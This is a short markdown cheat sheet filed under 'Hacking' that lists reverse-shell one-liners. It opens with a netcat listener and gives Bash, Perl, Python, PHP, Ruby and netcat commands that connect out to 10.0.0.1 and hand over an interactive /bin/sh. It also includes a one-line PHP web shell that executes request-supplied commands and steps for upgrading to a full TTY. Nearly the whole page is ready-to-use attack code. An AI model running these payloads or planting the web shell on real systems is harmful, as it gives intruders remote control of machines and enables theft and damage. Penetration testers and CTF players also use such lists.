---
title: Shell
category: Hacking
layout: main/sheet
updated: 2020-02-06
---

## Shell

### Create a TCP Server

```bash
nc -lnvp 9000
```

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### PERL

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
<?php echo system($_REQUEST['cmd']); ?>
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```bash
nc -e /bin/sh 10.0.0.1 1234
```


### Beautiful Shell

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

```bash
CTRL+Z
stty raw -echo
fg
```

